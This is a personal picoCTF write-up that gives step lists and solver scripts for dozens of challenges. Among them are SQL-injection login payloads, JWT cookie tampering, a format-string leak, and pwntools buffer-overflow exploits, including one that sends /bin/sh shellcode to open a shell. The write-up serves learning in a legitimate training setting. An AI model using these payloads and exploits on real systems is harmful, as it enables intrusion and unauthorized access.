# PicoCTF Write-UP (16 ~ 20 page)
## waves over lambda
![](https://i.imgur.com/uGWVyW8.png)

### Hints
1. Flag is not in the usual flag format

### Solution by steps
1. `nc jupiter.challenges.picoctf.org 13758` and copy the outputs
2. Paste them to [quipqiup](https://www.quipqiup.com/) and get your flag

### Useful Stuffs
1. https://www.quipqiup.com/

## flag_shop
![](https://i.imgur.com/8O4Wg0d.png)

### Hints
1. Two's compliment can do some weird things when numbers get really big!

### Solution by steps
1. Read the `store.c` and `nc jupiter.challenges.picoctf.org 44566`
2. Press `2` >>> `1` >>> `99999999` >>> `2` >>> `2` >>> `1`

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10243113

## Investigative Reversing 0
![](https://i.imgur.com/A0l0bXa.png)

### Hints
1. Try using some forensics skills on the image
2. This problem requires both forensics and reversing skills
3. A hex editor may be helpful

### Solution by steps
1. `wget` everything and run `xxd -g 1 mystery.png | tail` to get this:
```python
0001e7f0: 82 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21  . .. .. .. d.2.!
0001e800: 08 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82  .. .. .. .B.!#..
0001e810: 20 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08   .. .. .. d.2.!.
0001e820: 82 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20  . .. .. .B.!#.. 
0001e830: 08 82 20 08 82 20 08 82 20 64 1f 32 12 21 08 82  .. .. .. d.2.!..
0001e840: 20 08 82 20 08 82 20 08 42 f6 21 23 11 82 20 08   .. .. .B.!#.. .
0001e850: 82 20 08 82 20 08 82 20 64 17 ff ef ff fd 7f 5e  . .. .. d......^
0001e860: ed 5a 9d 38 d0 1f 56 00 00 00 00 49 45 4e 44 ae  .Z.8..V....IEND.
0001e870: 42 60 82 70 69 63 6f 43 54 4b 80 6b 35 7a 73 69  B`.picoCTK.k5zsi
0001e880: 64 36 71 5f 64 31 64 65 65 64 61 61 7d           d6q_d1deedaa}
```
2. Download `mystery` to Ghidra and read the codes
3. `vim solve.py` and write
```python
import os
import mmap

def memory_map(filename, access=mmap.ACCESS_READ):
    size = os.path.getsize(filename)
    fd = os.open(filename, os.O_RDONLY)
    return mmap.mmap(fd, size, access=access)

with memory_map("mystery.png") as b:
    flag = b[-26:]
    for i in range(6):
        print(chr(flag[i]), end='')
    for i in range(6, 15):
        print(chr(flag[i] - 5), end='')
    print(chr(flag[15] + 3), end='')
    for i in range(16, 26):
        print(chr(flag[i]), end='')
    print ("")
```
4. Run `python solve.py` to get the flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_0.md

## asm3
![](https://i.imgur.com/Z9eZVti.png)

### Hints
1. more(?) [registers](https://wiki.skullsecurity.org/index.php?title=Registers)

### Solution by steps
1. `wget` everything and run`strings test.S`:
```sequence
asm3:
        <+0>:   push   ebp
        <+1>:   mov    ebp,esp
        <+3>:   xor    eax,eax
        <+5>:   mov    ah,BYTE PTR [ebp+0xa]
        <+8>:   shl    ax,0x10
        <+12>:  sub    al,BYTE PTR [ebp+0xc]
        <+15>:  add    ah,BYTE PTR [ebp+0xd]
        <+18>:  xor    ax,WORD PTR [ebp+0x10]
        <+22>:  nop
        <+23>:  pop    ebp
        <+24>:  ret
```
2. Use an emulator and adds these codes in front of codes above
```sequence
start:
    push 0xb8c70926
    push 0xf55018af
    push 0xfe8cf7a4
    call asm3

```
3. Run after setting breakpoint on `ret`

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/asm3.md
2. https://stroobants.dev/picoctf-series-re-asm3.html
3. https://www.youtube.com/watch?v=V-UnH1vL4Bg&ab_channel=MartinCarlisle

## miniRSA
![](https://i.imgur.com/gsUMDlh.png)

### Hints
1. RSA [tutorial](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
2. How could having too small an e affect the security of this 2048 bit key?
3. Make sure you don't lose precision, the numbers are pretty big (besides the e value)

### Solution by steps
1. `wget` and `cat` the file
2. `vim solve.py`:
```python
import binascii
c = 2205316413931134031074603746928247799030155221252519872649649212867614751848436763801274360463406171277838056821437115883619169702963504606017565783537203207707757768473109845162808575425972525116337319108047893250549462147185741761825125
n = 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673

# from https://riptutorial.com/python/example/8751/computing-large-intege-roots

def nth_root(x, n):
    # Start with some reasonable bounds around the nth root.
    upper_bound = 1
    while upper_bound ** n <= x:
        upper_bound *= 2
    lower_bound = upper_bound // 2
    # Keep searching for a better result as long as the bounds make sense.
    while lower_bound < upper_bound:
        mid = (lower_bound + upper_bound) // 2
        mid_nth = mid ** n
        if lower_bound < mid and mid_nth < x:
            lower_bound = mid
        elif upper_bound > mid and mid_nth > x:
            upper_bound = mid
        else:
            # Found perfect nth root.
            return mid
    return mid + 1

for i in range(4000):
   st=("{:x}".format(nth_root(c+i*n,3)))
   if "7069636f" in st:  # "pico" in hex
      print(st)
      print(binascii.unhexlify(st))
```
3. Run `python solve.py` to get your flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=B2Dz1KMSFho&ab_channel=MartinCarlisle

## vault-door-5
![Uploading file..._mjk2r0gmr]()

### Hints
1. You may find an encoder/decoder tool helpful, such as https://encoding.tools/
2. Read the wikipedia articles on URL encoding and base 64 encoding to understand how they work and what the results look like.

### Solution by steps
1. `wget` and `strings` the file, look at the last function
```java
public boolean checkPassword(String password) {
        String urlEncoded = urlEncode(password.getBytes());
        String base64Encoded = base64Encode(urlEncoded.getBytes());
        String expected = "JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm"
                        + "JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2"
                        + "JTM0JTVmJTY1JTMzJTMxJTM1JTMyJTYyJTY2JTM0";
        return base64Encoded.equals(expected);
    }
```
2. `node` and run `decodeURIComponent(Buffer.from("JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTY1JTMzJTMxJTM1JTMyJTYyJTY2JTM0", 'base64').toString());` to get the flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/vault-door-5.md

## reverse_cipher
![Uploading file..._aryrcqd5m]()

### Hints
1. objdump and Gihdra are some tools that could assist with this

### Solution by tseps
1. `wget` all the files and `cat rev_this` but it returns the wrong flag
2. Download `rev`, put in Ghidra and read the main function
3. `vim solve.py` and write down
```python
import os
import mmap

def memory_map(filename, access=mmap.ACCESS_READ):
    size = os.path.getsize(filename)
    fd = os.open(filename, os.O_RDONLY)
    return mmap.mmap(fd, size, access=access)

with memory_map("rev_this") as bin_file:
    for i in range(8):
        print(chr(bin_file[i]), end = '')
    for i in range(8, 23):
        if (i & 1) == 0:
            print(chr(bin_file[i] - 5), end = '')
        else:
            print(chr(bin_file[i] + 2), end = '')
    print (chr(bin_file[23]))
```
4. Run `python solve.py` to get the key

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/reverse_cipher.md

## Irish-Name-Repo 1
![](https://i.imgur.com/8mLpok6.png)

### Hints
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

### Solution by steps
1. Press the link and click the Admin Login in the three lines
![](https://i.imgur.com/c3UoZq9.jpg)
2. Type `admin' --` in username and anything you like to the password blank
![Uploading file..._4llp8e9bl]()
3. Press the login button to get the flag

### Useful Stuffs
None

## shark on wire 2
![](https://i.imgur.com/FcgCr65.png)

### Hints
None

### Solution by steps
1. `wget` the file and run `tshark -Y "udp" -T fields -e udp.port -r capture.pcap | grep ",22" | sed -s 's/,22//g' | sed 's/.//1' | tr '\n' ' '`
2. Paste the output to [ASCII to text converter](http://www.unit-conversion.info/texttools/ascii/) and get your flag

### Useful Stuffs
1. https://hell38vn.wordpress.com/2020/10/14/picoctf/
2. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/shark_on_wire_2.md

## Guessing Game 2 (SUPER_DUPER_SUPER_DUPER_HARD)
![Uploading file..._9u4f3x2s2]()

### Hints
1. No longer a static binary, but maybe this will help https://libc.blukat.me/
2. Check out the other differences in the Makefile as well.

### Solution by steps
It seems quite weird that webshell died lots of time when I'm start brute forcing...

### Useful Stuffs
1. https://captain-woof.medium.com/picoctf-guessing-game-2-walkthrough-ret2libc-stack-cookies-6f9fc39273bf
2. https://www.youtube.com/watch?v=33IZP-XYfds&ab_channel=MartinCarlisle

## OTP Implementation (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/eG0whk0.png)

### Hints
1. https://sourceware.org/gdb/onlinedocs/gdb/Python-API.html
2. I think GDB Python is very useful, you can solve this problem without it, but can you solve future problems (hint hint)?
3. Also test your skills by solving this with ANGR!

### Solution by steps
Web shell acts very different as linux's...

### Useful Stuffs
1. https://alisyakainth.medium.com/hacking-series-part-13-f81d533602ec
2. https://www.youtube.com/watch?v=ceTyGWkB3Lo&ab_channel=MartinCarlisle

## It's Not My Fault 1
![](https://i.imgur.com/if9BGo1.png)

### Hints
None

### Solution by steps
...Web shell died every time I run the brute forcing function :cry:

### Useful Stuffs
1. https://github.com/HHousen/PicoCTF-2021/blob/master/Cryptography/It's%20Not%20My%20Fault%201/script.py

## Web Gauntlet 3
![](https://i.imgur.com/tnF3I5v.png)

### Hints
1. Each filter is separated by a space. Spaces are not filtered.
2. There is only 1 round this time, when you beat it the flag will be in filter.php.
3. sqlite

### Solution by steps
1. Check the filter.php and get `Filters: or and true false union like = > < ; -- /* */ admin`
2. Click the link and do the same thing in Web Gauntlet 2 to get the flag

### Useful Stuffs
None

## Very very very Hidden
![](https://i.imgur.com/4RxtQL8.png)

### Hints
1. I believe you found something, but are there any more subtle hints as random queries?
2. The flag will only be found once you reverse the hidden message.

### Solution by steps
1. Download the file and open it in WireShark
2. Use `dns` filter and find out that there are a hostname which is `powershell`
3. `File` >>> `Export Objects` >>> `HTTP` >>> `Save All` and you'll see files including `duck.png`, `evil_duck.png`(which is much more larger than `duck.png`)
4. open the `evil_duck.png` image in the [PowershellStegoDecode.exe program](https://github.com/HHousen/PicoCTF-2021/blob/6f9f20933e1ed467dbdfcdd7af027a06439e2d84/Forensics/Very%20very%20very%20Hidden/PowershellStegoDecode.exe)
5. Paste the output into PowerShell which creates a file called flag.txt with the flag in it.

### Useful Stuffs
1. https://github.com/HHousen/PicoCTF-2021/tree/6f9f20933e1ed467dbdfcdd7af027a06439e2d84/Forensics/Very%20very%20very%20Hidden

## New Vignere
![](https://i.imgur.com/HqmM2Bj.png)

### Hints
1. https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher#Cryptanalysis

### Solution by steps
1. Copy the red words. download the python file and realize how it works
2. `vim solve.py`:
```python
# import string
import string

# constants
LOWERCASE_OFFSET = ord("a")
ALPHABET = string.ascii_lowercase[:16]

# see caesar cipher for what these are
def b16_decode(cipher):
    dec = ""

    for c in range(0, len(cipher), 2):

        b = ""
        b += "{0:b}".format(ALPHABET.index(cipher[c])).zfill(4)
        b += "{0:b}".format(ALPHABET.index(cipher[c+1])).zfill(4)

        dec += chr(int(b,2))
    
    return dec

def unshift(c, k):
    t1 = ord(c) - LOWERCASE_OFFSET
    t2 = ord(k) - LOWERCASE_OFFSET
    return ALPHABET[(t1 - t2) % len(ALPHABET)]

# tries to decrypt
def get_key(s, matrix):
    # if we can't go further down
    if len(matrix) == 1:
        # add the last value
        for a in ALPHABET:
            k = str(s) + str(a)
            pt = ""
            for i,c in enumerate(enc):
                pt += unshift(c, k[i%len(k)])

            pt = b16_decode(pt)

            # if the plain text is good then print it
            if all(c in "abcdef0123456789" for c in pt):
                print(pt)
        return
    
    # recursively build key string
    for x in matrix[0]:
        s2 = str(s) + str(x)
        get_key(s2, matrix[1:len(matrix)])

# encrypted text
enc = "bgjpchahecjlodcdbobhjlfadpbhgmbeccbdefmacidbbpgioecobpbkjncfafbe"


keys = []

# create array
[keys.append([]) for i in range(0,32)]

# loop through alphabet twice
for a in ALPHABET:
    for b in ALPHABET:
        # generate key pair
        key = str(a) + str(b)
        
        # store plain text      
        pt = ""

        # unshift all values with key pair
        for i,c in enumerate(enc):
            pt += unshift(c, key[i%len(key)])

        # decode
        pt = b16_decode(pt)

        # loop through decrypted plaintext
        for cur in range(0, len(pt)):

            # check each plaintext char to see if its valid, if it is then add the arrays
            if pt[cur] in "abcdef0123456789":
                keys[cur].append(key)

# print the possible key pairs
for key in keys:
    print(key)

# decrypt the code
get_key("", keys[0:5])
```
3. Run `python solve.py` and get your key

### Useful Stuffs
1. https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/new-vignere

## Rolling My Own
![](https://i.imgur.com/Kb3ViGN.png)

### Hints
1. It's based on [this paper](https://link.springer.com/article/10.1007/s11416-006-0011-3)
2. Here's the start of the password: D1v1

### Solution by steps
1. `nc mercury.picoctf.net 11220` and pass ` D1v1d3AndC0n\rpB` to get your flag

### Useful Stuffs
1. https://github.com/1GN1tE/CTF_Writeups/tree/main/Writeups/picoCTF_2021/Rolling%20My%20Own

## JAuth
![](https://i.imgur.com/DsK8GeP.png)

### Hints
1. Use the web browser tools to check out the JWT cookie.
2. The JWT should always have two (2) . separators.

### Solution by steps
1. Login the website as it said
2. Copy the cookie value through 'EditThisCookie'
3. Paste it at [here](https://token.dev/) and change it like this
![](https://i.imgur.com/YB5UDhT.png)
4. Copy the JWT String and change the cookie on the website to it
5. Refresh the website to get the flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=njsjTVcwGwY&ab_channel=Raaven

## Bbbbloat
![](https://i.imgur.com/SMpriKG.png)

### Hints
None

### Solution by steps
1. Open with Ghidra and find the favorite in `undefined8 FUN_00101307(void)`
2. Run `./bbbbloat` and input the number you just get 
3. Hit enter to get the flag

### Useful Stuffs
1. https://tzion0.github.io/posts/picoctf2022-rev/

## buffer overflow 2
![](https://i.imgur.com/vxxicdP.png)

### Hints
1. Try using GDB to print out the stack once you write to it.

### Solution by steps
1. `wget` all the files it gave and `strings vuln.c`
2. `chmod +x ./vuln` and run `info function`
3. After reading it, `vim solve.py`:
```python
from pwn import *

#elf = context.binary = ELF("./vuln")
context.arch = 'amd64'
gs = '''
continue
'''

def start(server=True):
        if(server):
                return remote('saturn.picoctf.net', 50944)
        else:

                return process(['./vuln'])

io = start()

#io.recvuntil(">>")
a = 'A' * 112
a += "\x96\x92\x04\x08"
a += "CCCC"
a += "\x0d\xf0\xfe\xca"
a += "\x0d\xf0\x0d\xf0"
io.sendline(a)

io.interactive()
```
4. `python solve.py` and get your flag

### Useful Stuffs
1. https://github.com/LambdaMamba/CTFwriteups/tree/main/picoCTF_2022/Binary_Exploitation/buffer_overflow_2

## buffer overflow 3
![](https://i.imgur.com/4DvfQ2B.png)

### Hints
1. Maybe there's a smart way to brute-force the canary?

### Solution by steps
1. `wget` all the files and `strings vuln.c`
2. `vim solve.py` and write:
```python
#!/usr/bin/env python3
from pwn import *
from string import printable

elf = context.binary = ELF("./vuln", checksec=False)
host, port = "saturn.picoctf.net", 60121
offset = 64

def new_process():
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote(host, port)

def get_canary():
    canary = b""
    logger = log.progress("Finding canary...")
    for i in range(1, 5):
        for char in printable:
            with context.quiet:
                p = new_process()
                p.sendlineafter(b"> ", str(offset + i).encode())
                p.sendlineafter(b"> ", flat([{offset: canary}, char.encode()]))
                output = p.recvall()
                if b"?" in output:
                    canary += char.encode()
                    logger.status(f'"{canary.decode()}"')
                    break
    logger.success(f'"{canary.decode()}"')
    return canary

canary = get_canary()
p = new_process()
payload = flat([{offset: canary}, {16: elf.symbols.win}])
p.sendlineafter(b"> ", str(len(payload)).encode())
p.sendlineafter(b"> ", payload)
log.success(p.recvall().decode("ISO-8859-1"))
```
3. Run `python solve.py` to get the flag

### Useful Stuffs
1. https://enscribe.dev/ctfs/pico22/pwn/buffer-overflow-series/#Buffer-overflow-3

## Eavesdrop
![](https://i.imgur.com/UgDAS6O.png)

### Hints
1. All we know is that this packet capture includes a chat conversation and a file transfer.

### Solution by steps
1. `wget` the pcap file
2. `tshark -r capture.flag.pcap -q -z conv,tcp` to look how much tcp streams are there
3. `tshark -r capture.flag.pcap -q -z follow,tcp,ascii,0`, `tshark -r capture.flag.pcap -q -z follow,tcp,ascii,1`, `tshark -r capture.flag.pcap -q -z follow,tcp,ascii,2` and look whats contains in those TCP streams
4. `tshark -r capture.flag.pcap -q -z follow,tcp,raw,2 | tail -n +7 | head -n 1 | xxd -r -p > secret ` to get raw information
5. `openssl des3 -d -salt -in secret  -k supersecretpassword123` to get your flag

### Useful Stuffs
1. https://github.com/pmateja/picoCTF_2022_writeups/blob/main/Eavesdrop.md

## flag leak
![](https://i.imgur.com/acxuDtx.png)

### Hints
1. Format Strings

### Solution by steps
1. `wget` all the files and `strings vuln.c`
2. `nc saturn.picoctf.net 52484` and pass `%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x`
3. Copy the output and put it in [CyberChef](https://gchq.github.io/CyberChef/) drag 'Swap endianness' & 'From Hex' and delete useless stuff when looking at the output
![](https://i.imgur.com/GxrM0fx.png)

### Useful Stuffs
1. https://github.com/LambdaMamba/CTFwriteups/tree/main/picoCTF_2022/Binary_Exploitation/flag_leak
2. https://gchq.github.io/CyberChef/

## Operation Oni(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/4efOl91.png)

### Hints
None

### Solution by steps
Ran into *Load key "key_file": error in libcrypto* and I have no any permission to `apt-get install`...

### Useful Stuffs
1. https://github.com/LambdaMamba/CTFwriteups/tree/main/picoCTF_2022/Forensics/Operation_Oni
2. https://github.com/DoomHackCTF/WriteUps/tree/main/picoCTF2022/Forensics/Operation%20Oni
3. https://github.com/not1cyyy/CTF-Writeups/wiki/PicoCTF-:-Operation-Oni
4. https://github.com/pmateja/picoCTF_2022_writeups/blob/main/Operation_Oni.md
5. https://www.youtube.com/watch?v=fGWdueqArzE&ab_channel=AlmondForce

## ropfu
![](https://i.imgur.com/M8qljoG.png)

### Hints
1. This is a classic ROP to get a shell

### Solution by steps
1. `wget` all the stuffs and `chmod +x ./vuln`
2. `strings vuln.c` and read the results
3. `vim solve.py` and `python solve.py` to get the flag
```python
from pwn import *

elf = ELF('./vuln')

if args.REMOTE:
    p = remote('saturn.picoctf.net', 64763)
else:
    p = process(elf.path)

# payload buffer
payload = b"\x90"*6 # nop sled
payload += b"\xFF\xE4" # jmp esp - jump to the shell code right after the return address
payload += b"\x90"*20 # nop sled
payload += p32(0x0805334b) # jmp eax - will jump to start of buf which jump again to the shell code right after the return address
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # shell code

print(p.recvuntil('!'))
p.sendline(payload)
p.interactive()
```

### Useful Stuffs
1. https://github.com/evyatar9/Writeups/tree/master/CTFs/2022-picoCTF2022/Binary_Exploitation/300-ropfu

## SQLiLite
![](https://i.imgur.com/bjDgNtm.png)

### Hints
1. admin is the user you want to login as.

### Solution by steps
1. Press the button and login with `'or 1=1 -- -` in both blanks
2. Right-click and choose 'Inspect' to get the flag

### Useful Stuffs
None

## St3g0
![](https://i.imgur.com/wEpbiOt.png)

### Hints
1. We know the end sequence of the message will be $t3g0.

### Solution by steps
1. `wget` the png file and `vim solve.py`
```python
#import libraries
import sys
import numpy as np
from PIL import Image
np.set_printoptions(threshold=sys.maxsize)

#encoding function
def Encode(src, message, dest):

    img = Image.open(src, 'r')
    width, height = img.size
    array = np.array(list(img.getdata()))

    if img.mode == 'RGB':
        n = 3
    elif img.mode == 'RGBA':
        n = 4

    total_pixels = array.size//n

    message += "$t3g0"
    b_message = ''.join([format(ord(i), "08b") for i in message])
    req_pixels = len(b_message)

    if req_pixels > total_pixels:
        print("ERROR: Need larger file size")

    else:
        index=0
        for p in range(total_pixels):
            for q in range(0, 3):
                if index < req_pixels:
                    array[p][q] = int(bin(array[p][q])[2:9] + b_message[index], 2)
                    index += 1

        array=array.reshape(height, width, n)
        enc_img = Image.fromarray(array.astype('uint8'), img.mode)
        enc_img.save(dest)
        print("Image Encoded Successfully")

#decoding function
def Decode(src):

    img = Image.open(src, 'r')
    array = np.array(list(img.getdata()))

    if img.mode == 'RGB':
        n = 3
    elif img.mode == 'RGBA':
        n = 4

    total_pixels = array.size//n

    hidden_bits = ""
    for p in range(total_pixels):
        for q in range(0, 3):
            hidden_bits += (bin(array[p][q])[2:][-1])

    hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]

    message = ""
    for i in range(len(hidden_bits)):
        if message[-5:] == "$t3g0":
            break
        else:
            message += chr(int(hidden_bits[i], 2))
    if "$t3g0" in message:
        print("Hidden Message:", message[:-5])
    else:
        print("No Hidden Message Found")

#main function
def Stego():
    print("--Welcome to $t3g0--")
    print("1: Encode")
    print("2: Decode")

    func = input()

    if func == '1':
        print("Enter Source Image Path")
        src = input()
        print("Enter Message to Hide")
        message = input()
        print("Enter Destination Image Path")
        dest = input()
        print("Encoding...")
        Encode(src, message, dest)

    elif func == '2':
        print("Enter Source Image Path")
        src = input()
        print("Decoding...")
        Decode(src)

    else:
        print("ERROR: Invalid option chosen")

Stego()
```
2. `python solve.py` >>> `2` >>> `./pico.flag.png` and get your key

### Useful Stuffs
1. https://github.com/not1cyyy/CTF-Writeups/wiki/PicoCTF-:-st3g0

## unpackme
![](https://i.imgur.com/wZbioSn.png)

### Hints
1. What is UPX?

### Solution by steps
1. `wget`the file
2. `upx -d unpackme-upx`,`chmod +x unpackme-upx`
3. Use Ghidra to disassemble it
4. `./unpackme-upx` and enter the number you saw at the number beside 'local_44' in Ghidra's decompiled code

### Useful Stuffs
1. https://tzion0.github.io/posts/picoctf2022-rev/
2. https://www.youtube.com/watch?v=jAVYAvmEzj0&ab_channel=AlmondForce

## Very Smooth
![](https://i.imgur.com/gSnEguT.png)

### Hints
1. Don't look at me... Go ask Mr. Pollard if you need a hint!

### Solution by steps
1. `wget` all the files and look through them
2. `vim solve.py` and run `python solve.py` to get the flag
```python
from Crypto.Util.number import *
import gmpy2
import primefac

n = "YOUR_n_NUMBER"
c = "YOUR_c_NUMBER"

n = int(n,16)
e = 0x10001
q = primefac.pollard_pm1(n)
p = n//q
phi = (p-1)*(q-1)
d = inverse(e,phi)
print(long_to_bytes(pow(int(c,16),d,n)))
```

### Useful Stuffs
1. https://github.com/ZakariaR1ad/CTF-Writeups/blob/main/picoCTF%202022/crypto/VerySmooth.md

## wine
![](https://i.imgur.com/HmyEL68.png)

### Hints
1. Gets is dangerous. Even on windows.

### Solution by steps
1. ` python -c "print('A'*140 + '\x30\x15\x40\x00')" | nc saturn.picoctf.net 60188` and get your flag

### Useful Stuffs
1. https://github.com/Nickguitar/picoCTF2022/tree/main/pwn/wine

## Investigative Reversing 2
![](https://i.imgur.com/WCe1thJ.png)

### Hints
1. Try using some forensics skills on the image
2. This problem requires both forensics and reversing skills
3. What is LSB encoding?

### Solution by steps
1. `wget` all the files and check the binary one in Ghidra
2. `xxd -g 1 -s $((2000 - 32)) -l $((50*8 + 64)) encoded.bmp`
3. `vim solve.py` and run it to get the flag
```python
from pwn import unbits

with open("encoded.bmp", "rb") as data:
    data.seek(2000)
    bin_str = ""
    for j in range(50 * 8):
        byte = data.read(1)[0]
        bit = byte & 1
        bin_str += str(bit)

char_str = unbits(bin_str, endian='little')
print("Flag: " + "".join([chr(x + 5) for x in char_str]))
```

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/forensics/investigative-reversing-2

## droids1 (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/0JpZ2Y6.png)

### Hints
1. Try using apktool and an emulator
2. https://ibotpeaches.github.io/Apktool/
3. https://developer.android.com/studio

### Solution by steps
Yeah... I did not solve the VM/emulator problem on my laptop

### Useful Stuffs
1. https://www.youtube.com/watch?v=o31dpvOX7s8&ab_channel=MartinCarlisle

## Investigative Reversing 1
![](https://i.imgur.com/YyBFQgD.png)

### Hints
1. Try using some forensics skills on the image
2. This problem requires both forensics and reversing skills
3. A hex editor may be helpful

### Solution by steps
1. `wget` all the files and download the binary one open with Ghidra
2. ` xxd -g 1 PNG_FILE_YOU_WANTTA_LOOK | tail`
3. `vim solve.py` and run it to get the flag
```python
import os
import mmap

def memory_map(filename, access=mmap.ACCESS_READ):
    size = os.path.getsize(filename)
    fd = os.open(filename, os.O_RDONLY)
    return mmap.mmap(fd, size, access=access)

class Mystery(object):
    PNG_CRC_LEN = 4
    def __init__(self, file_name):
        self.map = memory_map(file_name)
        self.buffer = self.map[self.map.find(b"IEND") + len(b"IEND") + self.PNG_CRC_LEN:]
        self.offset = 0

    def read_byte(self):
        b = self.buffer[self.offset]
        self.offset += 1
        return b

    def __del__(self):
        self.map.close()

FLAG_LEN = 26

flag = [0] * FLAG_LEN
m1_stream = Mystery("mystery.png")
m2_stream = Mystery("mystery2.png")
m3_stream = Mystery("mystery3.png")

flag[1] = m3_stream.read_byte()
flag[0] = m2_stream.read_byte() - 0x15
flag[2] = m3_stream.read_byte()
flag[5] = m3_stream.read_byte()
flag[4] = m1_stream.read_byte()
for i in range(6, 10):
    flag[i] = m1_stream.read_byte()
flag[3] = m2_stream.read_byte() - (10 - 6)
for i in range(10, 15):
    flag[i] = m3_stream.read_byte()
for i in range(15, 26):
    flag[i] = m1_stream.read_byte()

print ("".join(chr(x) for x in flag))
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_1.md

## WebNet0
![](https://i.imgur.com/v2epX3o.png)

### Hints
1. Try using a tool like Wireshark.
2. How can you decrypt the TLS stream?

### Solution by steps
1. `wget` all the files and run `tshark -r capture.pcap  -o "ssl.debug_file:ssldebug.log" -o "ssl.desegment_ssl_records: TRUE" -o "ssl.desegment_ssl_application_data: TRUE" -o "ssl.keys_list:172.31.22.220,443,http,picopico.key" -qz follow,ssl,ascii,0` to get your flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/WebNet0.md

## vault-door-6
![](https://i.imgur.com/brnWV1N.png)

### Hints
1. If X ^ Y = Z, then Z ^ Y = X. Write a program that decrypts the flag based on this fact.

### Solution by steps
1. `wget` all the files and `strings VaultDoor6.java`
2. `vim solve.py` and run it to get the flag
```python
a = [0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d, 0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa , 0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27, 0xa , 0x6c, 0x61, 0x6d, 0x37, 0x6d, 0x6d, 0x6d,]
for b in a:
    print(chr(b ^ 0x55), end='')
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/vault-door-6.md

## seed-sPRiNG
![](https://i.imgur.com/ak3rz49.png)

### Hints
1. How is that program deciding what the height is?
2. You and the program should sync up!

### Solution by steps
1. `vim solve.c` and run `gcc -o  solve solve.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(0));
    for (int i = 1; i <= 30; i++) {
        printf("%d\n", rand() & 0xF);
    }
    return 0;
}
```
2. `./solve &&  nc jupiter.challenges.picoctf.org 35856` and follow the number outputs and type in the answer blanks

### Useful Stuffs
1. https://blog.maple3142.net/2020/11/23/picoctf-writeups/
2. https://www.youtube.com/watch?v=nuZ11WLItzs&ab_channel=MartinCarlisle

## Irish-Name-Repo 2
![](https://i.imgur.com/3FpI0As.png)

### Hints
1. The password is being filtered.

### Solution by steps
1. Press the link and type `admin' --` in username and anything you want in password blank

### Useful Stuffs
None

## 1_wanna_b3_a_r0ck5tar
![](https://i.imgur.com/zQD6chs.png)

### Hints
None

### Solution by steps
1. Download the file and copt strings inside
2. Paste them on [Rockstar](https://codewithrockstar.com/online?source=/rockstar/examples/fizzbuzz.rock)
